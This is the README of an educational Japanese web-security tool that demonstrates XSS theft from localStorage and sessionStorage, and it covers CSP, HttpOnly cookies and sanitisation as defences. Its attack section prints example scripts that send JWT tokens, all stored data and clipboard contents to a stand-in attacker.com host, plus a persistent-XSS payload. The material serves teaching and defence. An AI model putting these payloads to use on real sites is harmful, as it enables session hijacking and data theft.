# LocalStorage Playground - Webストレージの危険性の学習・体験ツール

![GitHub Repo stars](https://img.shields.io/github/stars/ipusiron/localstorage-playground?style=social)
![GitHub forks](https://img.shields.io/github/forks/ipusiron/localstorage-playground?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/ipusiron/localstorage-playground)
![GitHub license](https://img.shields.io/github/license/ipusiron/localstorage-playground)
[![GitHub Pages](https://img.shields.io/badge/demo-GitHub%20Pages-blue?logo=github)](https://ipusiron.github.io/localstorage-playground/)

**Day038 - 生成AIで作るセキュリティツール100**

**LocalStorage Playground** は、ブラウザーの `localStorage` や `sessionStorage` に保存されるデータの構造やセキュリティリスクを**実際に体験しながら学習**できる、インタラクティブな教育向けセキュリティツールです。

---

## 🎓 このツールの特徴

- **実践的学習**: 理論だけでなく、実際にXSS攻撃を実行して脅威を体感
- **安全な環境**: サンドボックス内でセキュリティ攻撃を安全に実験
- **視覚的理解**: ストレージデータの構造と脆弱性を直感的に把握
- **防御技術**: CSP、HttpOnly、サニタイゼーションの効果を実際に確認
- **即座に実行**: インストール不要、ブラウザーですぐに学習開始

多くのWebセキュリティ教材が理論中心なのに対し、本ツールは**「実際に攻撃してみる」「防御策の効果を目で見る」**ことで、より深い理解と記憶定着を促します。

---

## 🎯 対象者・ターゲット層

### 👥 **主要ターゲット**
- **Webデベロッパー** - フロントエンド・フルスタック開発者
- **セキュリティエンジニア** - Webアプリケーションセキュリティ担当者
- **情報セキュリティ学習者** - セキュリティ分野の学生・初学者

### 📚 **学習レベル別適用例**
| レベル | 対象者 | 学習目標 |
|--------|--------|----------|
| **初級** | プログラミング学習者 | localStorage/sessionStorageの基本動作理解 |
| **中級** | Web開発者 | XSS脆弱性とWebストレージの関係を体験 |
| **上級** | セキュリティ担当者 | 防御策の実装と効果検証手法を習得 |

### 🏢 **想定される利用シーン**
- **企業内セキュリティ研修** - 開発チーム向け実践的トレーニング
- **大学・専門学校の授業** - サイバーセキュリティ・Web開発課程
- **個人学習・自己啓発** - セキュリティスキル向上のための自主学習
- **セキュリティ監査前の準備** - 脆弱性理解と対策確認
- **技術勉強会・ハンズオン** - 参加者全員で同時体験可能

✅ **前提知識**: HTML/CSS/JavaScriptの基礎知識があると理解が深まります（必須ではありません）

---

## 🌐 デモページ

👉 [https://ipusiron.github.io/localstorage-playground/](https://ipusiron.github.io/localstorage-playground/)

---

## 📸 スクリーンショット

> ![ストレージに認証情報をセット](assets/screenshot.png)  
>
> *ストレージに認証情報をセット*

---

## 🎯 主な機能

### 📊 ストレージ管理機能
- `localStorage` / `sessionStorage` に保存されたデータの一覧表示
- 任意のキー・値の追加・編集・削除
- ストレージのクリア機能（片方または両方）
- 容量統計の表示とブラウザークォータチェック（モーダル表示）
- データのエクスポート機能（JSON形式、日本時間タイムスタンプ付きファイル名、💾アイコン）
- プリセットデータの自動生成
- リアルタイムデータ更新と検索・フィルタリング

### 🎯 XSS攻撃デモ
- 基本的な攻撃（トークン窃取、セッションデータ窃取）
- 高度な攻撃（全データ列挙、JSON一括取得）
- 持続的攻撃（マルウェア埋め込み、外部送信攻撃）
- 攻撃シナリオ選択UI
- セキュリティ影響分析とステップ表示

### 🛡️ 防御デモンストレーション
- CSP（Content Security Policy）の効果確認
- HttpOnly Cookieの防御力比較
- 入力サニタイゼーション前後の比較

### 📚 学習コンテンツ
- `localStorage` と `sessionStorage` の違いを視覚的に比較
- セキュリティ警告の表示（アクセス可能性・XSS盗難リスク）
- ベストプラクティスとセキュアな実装例

---

## 🧪 使用技術

- HTML / CSS / JavaScript（Vanilla JS）
- `localStorage`, `sessionStorage`, `DOM`, `EventListener`
- （一部：`innerHTML`や`eval()` の安全な取り扱い）

---

## 📚 学べること

- Web Storage APIの基本と構造
- クライアントストレージにおけるセキュリティ上の注意点
- XSSと組み合わさることでの深刻な情報漏洩例
- `HttpOnly Cookie`との違い
- `sessionStorage`の適切な用途と寿命

---

## 🚨 XSSとlocalStorageの組み合わせ攻撃

### 攻撃シナリオ

#### 1. 基本的な攻撃パターン
```javascript
// XSS脆弱性を悪用して、localStorage内のトークンを盗む
<script>
  // JWTトークンの窃取
  const token = localStorage.getItem('jwt_token');
  const userData = localStorage.getItem('user_data');
  
  // 攻撃者のサーバーへ送信
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, userData }),
  });
</script>
```

#### 2. 全データ窃取攻撃
```javascript
// localStorage内の全データを一括で盗む
<script>
  const allData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
  }
  
  // Base64エンコードして送信
  const img = new Image();
  img.src = `https://attacker.com/collect?data=${btoa(JSON.stringify(allData))}`;
</script>
```

#### 3. 持続的攻撃（Persistent XSS）
```javascript
// localStorageにマルウェアを仕込む
<script>
  // 悪意のあるコードをlocalStorageに保存
  localStorage.setItem('app_config', JSON.stringify({
    apiUrl: 'https://attacker.com/api',
    tracking: '<img src=x onerror="alert(document.cookie)">'
  }));
  
  // アプリケーションがこのデータを信頼して使用すると...
  // 継続的にXSSが発生する
</script>
```

### 実際の被害例

| 攻撃タイプ | 被害内容 | 影響度 |
|-----------|---------|--------|
| **認証トークン窃取** | JWTやセッショントークンが盗まれ、なりすましログインが可能に | 🔴 重大 |
| **個人情報漏洩** | ユーザー設定、プロファイル情報、操作履歴などが流出 | 🔴 重大 |
| **アカウント乗っ取り** | 認証情報を使って完全にアカウントを制御される | 🔴 重大 |
| **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
| **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |

### 🔗 関連する攻撃手法

本ツールはlocalStorage/sessionStorageに焦点を当てていますが、実際のXSS攻撃では以下の手法と組み合わされることがあります：

#### 📋 クリップボード攻撃
```javascript
// ユーザーがコピーした機密情報（パスワード、秘密鍵等）を窃取
const clipboardData = await navigator.clipboard.readText();
fetch('https://attacker.com/steal-clipboard', {
  method: 'POST',
  body: clipboardData
});
```

#### 🍪 Cookie窃取
```javascript
// HttpOnlyでないCookieを窃取
document.cookie; // "sessionid=abc123; preferences=dark"
```

#### 📱 デバイス情報収集
```javascript
// ブラウザー・OS・画面解像度等の情報収集
navigator.userAgent;
screen.width + "x" + screen.height;
```

#### 🎯 複合攻撃の例
実際の攻撃では、localStorage/sessionStorage、Cookie、クリップボード、デバイス情報を**同時に窃取**して攻撃者サーバーに送信することで、より大きな被害をもたらします。

⚠️ **重要:** 本ツールはWebストレージのセキュリティリスクの学習に特化していますが、実際のセキュリティ対策では、これらの関連攻撃も含めた包括的な防御策が必要です。

---

## 🛡️ 防御デモンストレーション機能

本ツールには、XSS攻撃に対する主要な防御技術を実際に体験できるデモ機能が含まれています：

### 📋 CSP (Content Security Policy) デモ
- インラインスクリプト実行の**ブロック前後**を比較表示
- 実装方法とヘッダー設定例を提示
- 攻撃成功/失敗の明確な視覚化

### 🔐 HttpOnly Cookie デモ  
- 通常のCookieとHttpOnly Cookieの**アクセス可能性比較**
- JavaScriptからのCookieアクセス試行結果を実演
- サーバーサイド実装コード例を提供

### 🧹 入力サニタイゼーションデモ
- 危険なHTMLタグ/スクリプトの**エスケープ前後比較**
- DOMPurifyなどのライブラリ使用例
- サニタイゼーション効果の実際の動作確認

これらのデモにより、理論だけでなく**実際の防御効果**を体感できます。

---

### 防御策

#### ✅ 推奨される対策

1. **機密情報はlocalStorageに保存しない**
   ```javascript
   // ❌ 悪い例
   localStorage.setItem('auth_token', token);
   
   // ✅ 良い例 - HttpOnly Cookieを使用
   // サーバー側で設定:
   // Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict
   ```

2. **Content Security Policy (CSP) の実装**
   ```html
   <meta http-equiv="Content-Security-Policy" 
         content="default-src 'self'; script-src 'self'">
   ```

3. **入力値の適切なサニタイゼーション**
   ```javascript
   // DOMPurifyなどのライブラリを使用
   const clean = DOMPurify.sanitize(userInput);
   ```

4. **トークンの短期化と更新**
   ```javascript
   // トークンに有効期限を設定
   const tokenData = {
     value: 'xxx',
     expires: Date.now() + (15 * 60 * 1000) // 15分
   };
   ```

### セキュアな実装例

```javascript
// セキュアなストレージラッパーの実装
class SecureStorage {
  // 暗号化して保存（完全ではないが、単純な攻撃を防ぐ）
  static setItem(key, value, isPublic = false) {
    if (!isPublic && this.isSensitive(key)) {
      console.warn(`Warning: Storing potentially sensitive data in localStorage`);
      return false;
    }
    
    const data = {
      value: value,
      timestamp: Date.now(),
      checksum: this.generateChecksum(value)
    };
    
    localStorage.setItem(key, JSON.stringify(data));
  }
  
  // 改ざんチェック付きで取得
  static getItem(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    const data = JSON.parse(item);
    if (this.generateChecksum(data.value) !== data.checksum) {
      console.error('Data tampering detected!');
      localStorage.removeItem(key);
      return null;
    }
    
    return data.value;
  }
  
  static isSensitive(key) {
    const sensitivePatterns = ['token', 'password', 'secret', 'key', 'auth'];
    return sensitivePatterns.some(pattern => 
      key.toLowerCase().includes(pattern)
    );
  }
  
  static generateChecksum(value) {
    // 簡易的なチェックサム（本番環境では適切なハッシュ関数を使用）
    return btoa(JSON.stringify(value)).slice(-10);
  }
}
```

### ⚠️ 重要な注意点

- **localStorage/sessionStorageは、XSS攻撃に対して無防備です**
- **JWTトークンやAPIキーなどの機密情報は絶対に保存しないでください**
- **HttpOnly Cookieを使用することで、JavaScriptからのアクセスを防げます**
- **定期的なセキュリティ監査とペネトレーションテストを実施してください**

---

## 📁 ディレクトリー構成

```
localstorage-playground/
├── index.html                 # メインHTMLファイル
├── style.css                  # CSSスタイル（レスポンシブ・ダークモード対応）
├── main.js                    # エントリーポイント（ES6モジュール）
├── modules/                   # 機能別モジュール
│   ├── tabs.js               # タブ切り替え管理
│   ├── storage.js            # ストレージ操作（メイン機能）
│   │                         # - 容量統計・エクスポート・編集・削除
│   │                         # - プリセットデータ・検索・フィルタリング
│   │                         # - リアルタイム更新・インタラクティブテスト
│   ├── xss.js                # XSS攻撃デモ機能
│   │                         # - 攻撃シナリオ分類（基本・高度・持続的）
│   │                         # - セキュリティ影響分析・実行ステップ表示
│   ├── defense.js            # 防御デモンストレーション
│   │                         # - CSP・HttpOnly・サニタイゼーション実演
│   └── learn.js              # 学習コンテンツ（比較表・ベストプラクティス）
├── CLAUDE.md                 # 開発ドキュメント（Claude向け）
├── README.md                 # プロジェクト説明書
├── LICENSE                   # MITライセンス
└── assets/                   # 静的リソース
    └── screenshot.png        # デモスクリーンショット
```

---

## 📄 ライセンス

MIT License - 詳細は [LICENSE](LICENSE) をご覧ください。

---

## 🛠 このツールについて

本ツールは、「生成AIで作るセキュリティツール100」プロジェクトの一環として開発されました。 このプロジェクトでは、AIの支援を活用しながら、セキュリティに関連するさまざまなツールを100日間にわたり制作・公開していく取り組みを行っています。

プロジェクトの詳細や他のツールについては、以下のページをご覧ください。

🔗 [https://akademeia.info/?page_id=42163](https://akademeia.info/?page_id=42163)
